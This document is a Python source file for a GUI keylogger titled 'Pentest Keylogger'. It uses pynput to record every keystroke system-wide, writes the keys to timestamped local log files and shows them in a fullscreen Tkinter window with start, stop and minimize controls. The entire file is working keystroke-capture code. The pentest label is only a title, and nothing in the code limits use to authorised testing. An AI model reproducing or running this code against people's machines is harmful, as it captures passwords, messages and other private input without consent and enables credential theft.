import os
import tkinter as tk
from tkinter import scrolledtext, messagebox
from pynput import keyboard
from datetime import datetime

# Directory to save log files
LOG_DIR = "files"
if not os.path.exists(LOG_DIR):
    os.makedirs(LOG_DIR)

# Generate a log file name based on the current timestamp
log_file_name = os.path.join(LOG_DIR, f"keylog_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt")

# Global variable to keep track of the listener
listener = None

# Function to log keystrokes
def on_press(key):
    try:
        with open(log_file_name, "a") as log_file:
            log_file.write(f"{key.char}")
            # Append to log display if available
            if app.log_display:
                app.log_display.insert(tk.END, f"{key.char}")
                app.log_display.see(tk.END)
    except AttributeError:
        with open(log_file_name, "a") as log_file:
            log_file.write(f"[{key}]")
            # Append to log display if available
            if app.log_display:
                app.log_display.insert(tk.END, f"[{key}]")
                app.log_display.see(tk.END)

# Function to start the keylogger
def start_keylogger():
    global listener
    if listener is None:
        listener = keyboard.Listener(on_press=on_press)
        listener.start()
        app.update_status("Keylogger Active")
    else:
        app.update_status("Keylogger Already Running")

# Function to stop the keylogger
def stop_keylogger():
    global listener
    if listener:
        listener.stop()
        listener = None
        app.update_status("Keylogger Stopped")

# Creating the GUI application
class KeyLoggerApp:
    def __init__(self, root):
        self.root = root
        self.root.title("Pentest Keylogger")
        self.root.attributes('-fullscreen', True)
        
        # Title Label
        title_label = tk.Label(self.root, text="Pentest Keylogger", font=("Arial", 30))
        title_label.pack(pady=20)
        
        # Status Label
        self.status_label = tk.Label(self.root, text="Keylogger Inactive", font=("Arial", 14), fg="red")
        self.status_label.pack(pady=10)
        
        # Log display area
        self.log_display = scrolledtext.ScrolledText(self.root, wrap=tk.WORD, height=20, width=80)
        self.log_display.pack(pady=10)
        self.log_display.insert(tk.END, "Logs will appear here...\n")
        self.log_display.configure(state='disabled')

        # Start and Stop buttons
        button_frame = tk.Frame(self.root)
        button_frame.pack(pady=20)

        start_button = tk.Button(button_frame, text="Start Keylogger", command=self.start_logging, font=("Arial", 14))
        start_button.grid(row=0, column=0, padx=10)

        stop_button = tk.Button(button_frame, text="Stop Keylogger", command=self.stop_logging, font=("Arial", 14))
        stop_button.grid(row=0, column=1, padx=10)
        
        # Minimize and Exit buttons
        minimize_button = tk.Button(button_frame, text="Minimize", command=self.minimize_app, font=("Arial", 14))
        minimize_button.grid(row=0, column=2, padx=10)
        
        exit_button = tk.Button(button_frame, text="Exit", command=self.exit_app, font=("Arial", 14))
        exit_button.grid(row=0, column=3, padx=10)

    def update_status(self, message):
        self.status_label.config(text=message)
        if "Active" in message:
            self.status_label.config(fg="green")
            self.log_display.configure(state='normal')
        else:
            self.status_label.config(fg="red")
            self.log_display.configure(state='disabled')

    def start_logging(self):
        start_keylogger()

    def stop_logging(self):
        stop_keylogger()

    def minimize_app(self):
        self.root.iconify()

    def exit_app(self):
        stop_keylogger()
        self.root.quit()

# Main loop
if __name__ == "__main__":
    root = tk.Tk()
    app = KeyLoggerApp(root)
    root.mainloop()
